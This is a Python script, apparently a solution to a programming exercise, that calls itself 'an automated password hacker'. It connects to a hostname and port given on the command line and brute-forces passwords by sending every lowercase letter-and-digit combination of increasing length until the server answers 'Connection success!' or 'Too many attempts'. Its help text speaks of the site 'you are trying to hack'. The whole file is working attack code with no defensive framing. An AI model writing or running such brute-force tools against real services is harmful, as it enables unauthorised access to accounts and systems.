import argparse
import itertools
import socket

pass_hacker = argparse.ArgumentParser(description='An automated password hacker')
pass_hacker.add_argument("hostname", type=str, help='the IP address or domain name of the site you are trying to hack')
pass_hacker.add_argument("port", type=int, help='the port number of the site you are trying to hack')
args = pass_hacker.parse_args()

hacker = socket.socket()
address = (args.hostname, args.port)

# Create a list with a-z and 0-9
char_list = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(48, 58)]
flag = True
i = 1
with hacker as h:
    h.connect(address)
    while flag:
        combinations = itertools.product(char_list, repeat=i)
        for item in combinations:
            data = ''.join(item)  # change tuple to string
            data = data.encode()  # encode data string
            h.send(data)  # send data string
            rec_data = h.recv(1024)
            if rec_data == b'Connection success!':
                print(data.decode())
                flag = False
                break
            elif rec_data == b'Too many attempts':
                print('Too many attempts')
                flag = False
                break
        i += 1
